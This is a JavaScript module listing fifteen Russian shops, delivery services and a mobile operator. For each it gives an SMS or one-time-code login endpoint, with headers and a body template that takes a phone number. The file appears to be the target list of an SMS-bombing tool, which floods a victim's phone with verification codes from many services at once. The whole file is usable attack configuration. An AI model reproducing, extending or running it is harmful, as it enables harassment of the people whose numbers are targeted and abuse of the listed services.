module.exports = [
  {
    name: "M-Food",
    url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php",
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
    data: (phone) => `action=send_code&phone=${phone}`
  },
  {
    name: "Allo Pizza",
    url: "https://allopizza.su/api/v1/auth/otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "GrowFood",
    url: "https://growfood.pro/api/v1/auth/login",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "LetBeFit",
    url: "https://spb.letbefit.ru/ajax/auth.php",
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    data: (phone) => `action=send_sms&phone=${phone}`
  },
  {
    name: "Sushiwok",
    url: "https://sushiwok.ru/api/auth/login",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "Winelab",
    url: "https://www.winelab.ru/login/otp/send",
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    data: (phone) => `phone=${phone}`
  },
  {
    name: "Sokolov",
    url: "https://sokolov.ru/api/v2/auth/sms",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "Sunlight",
    url: "https://api.sunlight.net/v3/customer/authorization/",
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    data: (phone) => `phone=${phone}`
  },
  {
    name: "Eldorado",
    url: "https://www.eldorado.ru/api/auth/v1/sendSms",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "Hoff",
    url: "https://hoff.ru/api/v2/auth/send_code",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "ZolotoeYabloko",
    url: "https://goldapple.ru/rest/V1/customers/send_otp",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "Sportmaster",
    url: "https://www.sportmaster.ru/api/v1/auth/send_code",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "Lenta",
    url: "https://lenta.com/api/v1/auth/request_code",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "YandexEda",
    url: "https://eda.yandex.ru/api/v1/user/request_sms",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    data: (phone) => ({ phone: "+" + phone })
  },
  {
    name: "T2",
    url: "https://msk.tele2.ru/auth/realms/tele2/protocol/openid-connect/token",
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    data: (phone) => `username=${phone}&grant_type=password`
  }
];
